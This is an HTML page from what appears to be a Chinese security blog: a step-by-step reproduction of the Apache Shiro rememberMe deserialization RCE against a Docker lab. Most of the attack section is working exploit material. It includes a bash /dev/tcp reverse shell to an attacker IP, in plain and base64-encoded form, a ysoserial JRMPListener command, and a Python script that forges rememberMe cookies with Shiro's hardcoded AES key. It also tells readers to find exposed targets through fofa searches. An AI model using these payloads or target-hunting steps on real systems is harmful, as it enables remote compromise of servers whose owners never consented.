@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html  lang="en" >
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+    <title>Apache Shiro 复现 | Hexo</title>
+    <meta name="description" content="Apache Shiro 反序列化漏洞简介Apache Shiro 是ASF旗下的一款开源软件（Shiro发音为“shee-roh”，日语“堡垒（Castle）”的意思），提供了一个强大而灵活的安全框架。可为任何应用提供安全保障— 从命令行应用、移动应用到大型网络及企业应用。 Apache Shiro提供了认证、授权、加密和会话管理功能，将复杂的问题隐藏起来，提供清晰直观的API使开发者可以很轻松">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Shiro 复现">
+<meta property="og:url" content="http://example.com/2019/12/10/Apache-Shiro-%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Apache Shiro 反序列化漏洞简介Apache Shiro 是ASF旗下的一款开源软件（Shiro发音为“shee-roh”，日语“堡垒（Castle）”的意思），提供了一个强大而灵活的安全框架。可为任何应用提供安全保障— 从命令行应用、移动应用到大型网络及企业应用。 Apache Shiro提供了认证、授权、加密和会话管理功能，将复杂的问题隐藏起来，提供清晰直观的API使开发者可以很轻松">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/1578668083087.png">
+<meta property="og:image" content="http://example.com/images/1578667848813.png">
+<meta property="og:image" content="http://example.com/images/1578668299618.png">
+<meta property="og:image" content="http://example.com/images/1578668499584.png">
+<meta property="og:image" content="http://example.com/images/1578668956099.png">
+<meta property="og:image" content="http://example.com/images/1578669121185.png">
+<meta property="og:image" content="http://example.com/images/1578669501752.png">
+<meta property="og:image" content="http://example.com/images/1578669819559.png">
+<meta property="og:image" content="http://example.com/images/1578669884364.png">
+<meta property="og:image" content="http://example.com/images/1578669990601.png">
+<meta property="og:image" content="http://example.com/images/1578670069778.png">
+<meta property="og:image" content="http://example.com/images/20200110235049.jpg">
+<meta property="article:published_time" content="2019-12-10T14:23:07.000Z">
+<meta property="article:modified_time" content="2020-01-10T15:52:33.069Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/1578668083087.png">
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml">
+    <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+
+    
+<link rel="stylesheet" href="/css/common.min.css">
+
+
+
+    
+    
+    
+    
+        <link href="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/css/lightgallery.min.css" rel="stylesheet">
+    
+    
+    
+<link rel="stylesheet" href="/css/iconfont.min.css">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+    <body>
+        <header class="header header-fixture">
+    <div class="profile-search-wrap flex sm:block">
+        
+        
+        <div class="profile sm:text-center md:px-1 lg:px-3 sm:pb-4 sm:pt-6">
+            <a id="avatar" role="link" href="https://github.com/fengkx" class="inline-block lg:w-16 lg:h-16 w-8 h-8 m-2" target="_blank" rel="noopener" rel="noreferrer" >
+                <img src="https://www.gravatar.com/avatar/0bc83cb571cd1c50ba6f3e8a78ef1346?s=128" class="rounded-full" alt="avatar">
+            </a>
+            <h2 id="name" class="hidden lg:block">h00ls</h2>
+            <h3 id="title" class="hidden xl:block">安全那些事</h3>
+            
+            <small id="location" class="hidden lg:block">
+                <i class="iconfont icon-map-icon"></i>
+                Sichuan, China
+            </small>
+            
+        </div>
+        
+        
+<div class="search flex-1 flex lg:inline-block sm:hidden lg:px-4 lg:mt-2 lg:mb-4 lg:w-full">
+    <form id="search-form" class="my-auto flex-1 lg:border lg:border-solid lg:border-gray-200">
+        <div class="input-group table bg-gray-100 lg:bg-white w-full">
+            <input id="search-input" type="text" placeholder="Search" class="inline-block w-full bg-gray-100 lg:bg-white">
+            <span class="table-cell">
+                <button name="search tigger button" disabled>
+                    <i class="iconfont icon-search m-2"></i>
+                </button>
+            </span>
+        </div>
+    </form>
+        
+<script id="search-teamplate" type="text/html" data-path="/content.json">
+    <div>
+        <div class="search-header bg-gray-400">
+            <input id="actual-search-input" model="keyword" ref="input" class="inline-block w-full h-10 px-2 py-1" placeholder="Search" type="text">
+        </div>
+        <div class="search-result bg-gray-200">
+            {{#each searchPosts}}
+            <a href="/{{ path }}" class="result-item block px-2 pb-3 mb-1 pt-1 hover:bg-indigo-100">
+                <i class="iconfont icon-file"></i>
+                <h1 class="result-title inline font-medium text-lg">{{ title }}</h1>
+                <p class="result-content text-gray-600 text-sm">{{{ text }}}</p>
+            </a>
+            {{/each}}
+        </div>
+    </div>
+</script>
+
+</div>
+
+
+        <button name="menu toogle button" id="menu-toggle-btn" class="block sm:hidden p-3" role="button" aria-expanded="false">
+            <i class="iconfont icon-hamburger"></i>
+        </button>
+    </div>
+    <nav id="menu-nav" class="hidden sm:flex flex-col">
+        
+        
+            <div class="menu-item menu-home" role="menuitem">
+                <a href="/.">
+                    <i class="iconfont icon-home" aria-hidden="true"></i>
+                    <span class="menu-title">Home</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-archives" role="menuitem">
+                <a href="/archives">
+                    <i class="iconfont icon-archive" aria-hidden="true"></i>
+                    <span class="menu-title">Archives</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-categories" role="menuitem">
+                <a href="/categories">
+                    <i class="iconfont icon-folder" aria-hidden="true"></i>
+                    <span class="menu-title">Categories</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-tags" role="menuitem">
+                <a href="/tags">
+                    <i class="iconfont icon-tag" aria-hidden="true"></i>
+                    <span class="menu-title">Tags</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-repository" role="menuitem">
+                <a href="/repository">
+                    <i class="iconfont icon-project" aria-hidden="true"></i>
+                    <span class="menu-title">Repository</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-links" role="menuitem">
+                <a href="/links">
+                    <i class="iconfont icon-friend" aria-hidden="true"></i>
+                    <span class="menu-title">Links</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-about" role="menuitem">
+                <a href="/about">
+                    <i class="iconfont icon-cup" aria-hidden="true"></i>
+                    <span class="menu-title">About</span>
+                </a>
+            </div>
+        
+        
+<div class="social-links flex sm:flex-col lg:hidden mt-5">
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://github.com/fengkx">
+                <i class="iconfont social-icon icon-github"></i>
+                <span class="menu-title hidden lg:inline">menu.github</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://t.me/fengkx">
+                <i class="iconfont social-icon icon-telegram"></i>
+                <span class="menu-title hidden lg:inline">menu.telegram</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://twitter.com/example">
+                <i class="iconfont social-icon icon-twitter"></i>
+                <span class="menu-title hidden lg:inline">menu.twitter</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a href="/atom.xml">
+                <i class="iconfont social-icon icon-rss"></i>
+                <span class="menu-title hidden lg:inline">menu.rss</span>
+            </a>
+        </span>
+    
+</div>
+
+
+    </nav>
+</header>
+
+        <section class="main-section">
+            
+    <main class="flex-1 px-4 py-12 md:px-5 lg:px-8 lg:py-4 relative min-h-screen">
+    
+
+    <article class="content article article-archives article-type-list" itemscope="">
+        <header class="article-header">
+            
+    
+        <h1 class="article-title text-lg" itemprop="name">
+            Apache Shiro 复现
+        </h1>
+    
+
+
+
+            <p class="article-meta mb-3 text-xs">
+                <span class="article-date">
+    <i class="iconfont icon-calendar-check"></i>
+	<a href="/2019/12/10/Apache-Shiro-%E5%A4%8D%E7%8E%B0/" class="article-date">
+	  <time datetime="2019-12-10T14:23:07.000Z" itemprop="datePublished">Dec 10</time>
+	</a>
+</span>
+
+                
+
+                
+    <span class="article-tags">
+    <i class="iconfont icon-tag"></i>
+    <a class="article-tag-none-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+  </span>
+
+
+                <span class="_partial/post-comment"><i class="icon icon-comment"></i>
+                    <a href="/2019/12/10/Apache-Shiro-%E5%A4%8D%E7%8E%B0/#comments" class="article-comment-link">
+                        Comments
+                    </a>
+                </span>
+                
+    
+        <span class="post-wordcount" itemprop="wordCount">Word Count: 918(words)</span>
+    
+    
+        <span class="post-readcount" itemprop="timeRequired">Read Count: 4(minutes)</span>
+    
+
+
+            </p>
+        </header>
+        <div class="marked-body article-body">
+            <h1 id="Apache-Shiro-反序列化漏洞"><a href="#Apache-Shiro-反序列化漏洞" class="headerlink" title="Apache Shiro 反序列化漏洞"></a>Apache Shiro 反序列化漏洞</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Apache Shiro 是ASF旗下的一款开源软件（Shiro发音为“shee-roh”，日语“堡垒（Castle）”的意思），提供了一个强大而灵活的安全框架。可为任何应用提供安全保障— 从命令行应用、移动应用到大型网络及企业应用。</p>
+<p>Apache Shiro提供了认证、授权、加密和会话管理功能，将复杂的问题隐藏起来，提供清晰直观的API使开发者可以很轻松地开发自己的程序安全代码。并且在实现此目标时无须依赖第三方的框架、容器或服务，当然也能做到与这些环境的整合，使其在任何环境下都可拿来使用。</p>
+<a id="more"></a>
+
+<p>摘自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/peterwanghao/article/details/7997169">https://blog.csdn.net/peterwanghao/article/details/7997169</a> </p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache Shiro &lt;= 1.2.4 </p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li>一个Linux系统搭建 apache shiro</li>
+<li>Ubuntu系统充当攻击机</li>
+<li>一个Windows 10  (其实不要也行)</li>
+</ul>
+<h4 id="搭建-apache-shiro-环境"><a href="#搭建-apache-shiro-环境" class="headerlink" title="搭建 apache shiro 环境"></a>搭建 apache shiro 环境</h4><p>下载docker容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+<p>运行docker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:8080 medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+<p>访问：<code>http://192.168.43.200:8080</code></p>
+<p><img src="/images/1578668083087.png" alt="1578668083087"></p>
+<h4 id="利用工具准备"><a href="#利用工具准备" class="headerlink" title="利用工具准备"></a>利用工具准备</h4><p>主要工具：yoserial.jar</p>
+<p>先安装 <code>maven</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install maven</span><br></pre></td></tr></table></figure>
+<p>下载及安装 yoserial：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.git</span><br><span class="line"></span><br><span class="line">cd ysoserial&#x2F;</span><br><span class="line"></span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+<p>可一看下安装成功了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar</span><br></pre></td></tr></table></figure>
+<p><img src="/images/1578667848813.png" alt="1578667848813"></p>
+<p>将 <code>ysoserial-0.0.6-SNAPSHOT-all.jar</code> 重命名为 <code>ysoserial.jar</code>，因为后面要使用的 shiro.py 脚本中指定了 ysoserial.jar 名字调用，也可以修改脚本中的名称。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>Step 1：</strong>攻击机先监听 <code>666</code> 端口，用于接收到时候的反弹的 <code>shell</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@unihac:~# nc -lvp 666</span><br></pre></td></tr></table></figure>
+<p><img src="/images/1578668299618.png" alt="1578668299618"></p>
+<p><strong>Step 2：</strong>将需要在目标机器上执行的反弹命令加密。</p>
+<p>命令加密网址：<code>http://www.jackson-t.ca/runtime-exec-payloads.html </code></p>
+<p>需要加密的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.43.146&#x2F;666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img src="/images/1578668499584.png" alt="1578668499584"></p>
+<p><strong>Step 3：</strong> 用 yoserial.jar 监听一个端口 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@unihac:target# java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjE0Ni82NjYgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/1578668956099.png" alt="1578668956099"></p>
+<p><strong>Step 4：</strong>利用shiro.py 向 java 发送生成poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro.py 192.168.43.146:6666</span><br></pre></td></tr></table></figure>
+<p><img src="/images/1578669121185.png" alt="1578669121185"></p>
+<p>注意：python 版本为2.7</p>
+<p><strong>Step 5：</strong>先打开burpsuite，取消掉拦截，但要让流量经过burp。在Windows中访问 <code>http://192.168.43.200:8080</code> </p>
+<p><img src="/images/1578669501752.png" alt="1578669501752"></p>
+<p>在 history 中找到这样的请求包</p>
+<p><img src="/images/1578669819559.png" alt="1578669819559"></p>
+<p>将其发送到 Repeater 中</p>
+<p><img src="/images/1578669884364.png" alt="1578669884364"></p>
+<p>然后将我们在上一步获取到的 RememberMe 添加到 cookie 中。</p>
+<p><img src="/images/1578669990601.png" alt="1578669990601"></p>
+<p>发送出去。</p>
+<p><strong>Step 6：</strong>大功告成</p>
+<p>看下之前的 nc 监听的端口，可以看到已经返回了shell</p>
+<p><img src="/images/1578670069778.png" alt="1578670069778"></p>
+<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p> Apache Shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code> &gt;  <code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code>。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。 <a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/112742.html">摘自</a></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级到最新版本</p>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>使用网络空间搜索引擎，例如shadon、zoomeye、fofa等等进行扫描</p>
+<p>使用fofa 搜索 title=”apache shiro *” 或者 app=”jeesite”，全是apache shiro的</p>
+<p>例如：使用fofa 搜索app=”jeesite”</p>
+<p><img src="/images/20200110235049.jpg"></p>
+<p>借鉴：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8F5tmbJsE0SshrYK-fRl-g">https://mp.weixin.qq.com/s/8F5tmbJsE0SshrYK-fRl-g</a></p>
+<h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"> </span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+        </div>
+        
+<blockquote class="copyright">
+    <p><strong>Link to this article : </strong><a class="permalink" href="http://example.com/2019/12/10/Apache-Shiro-%E5%A4%8D%E7%8E%B0/">http://example.com/2019/12/10/Apache-Shiro-复现/</a></p>
+    <p><strong>This article is available under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a> License</strong></p>
+</blockquote>
+
+
+    </article>
+    
+    <section id="comments">
+        
+    </section>
+
+
+    
+
+</main>
+
+
+<aside style="" id="sidebar" class="aside aside-fixture">
+    <div class="toc-sidebar">
+        <nav id="toc" class="article-toc">
+            <h3 class="toc-title">Catalogue</h3>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">Apache Shiro 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.0.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.0.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.0.3.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA-apache-shiro-%E7%8E%AF%E5%A2%83"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">搭建 apache shiro 环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">利用工具准备</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.0.4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.0.5.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.0.6.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.0.7.</span> <span class="toc-text">漏洞挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%E4%BB%B6"><span class="toc-number">1.0.8.</span> <span class="toc-text">附件</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </div>
+</aside>
+
+
+
+
+
+        </section>
+        <footer class="hidden lg:block fixed bottom-0 left-0 sm:w-1/12 lg:w-1/6 bg-gray-100 z-40">
+    
+    <div class="footer-social-links">
+        
+            <a target="_blank" rel="noopener" href="https://github.com/fengkx">
+                <i class="iconfont icon-github"></i>
+            </a>
+        
+            <a target="_blank" rel="noopener" href="https://t.me/fengkx">
+                <i class="iconfont icon-telegram"></i>
+            </a>
+        
+            <a target="_blank" rel="noopener" href="https://twitter.com/example">
+                <i class="iconfont icon-twitter"></i>
+            </a>
+        
+            <a href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+            </a>
+        
+    </div>
+    
+    
+</footer>
+
+        <div id="mask" class="hidden mask fixed inset-0 bg-gray-900 opacity-75 z-40"></div>
+        <div id="search-view-container" class="hidden shadow-xl"></div>
+        
+<script src="/js/dom-event.min.js"></script>
+
+<script src="//cdn.jsdelivr.net/npm/yox@1.0.0-alpha.121/dist/standard/prod/yox.min.js"></script>
+
+
+<script src="/js/search.min.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/js/lightgallery.min.js"></script>
+    
+<script src="/js/light-gallery.min.js"></script>
+
+
+
+
+
+    </body>
+</html>
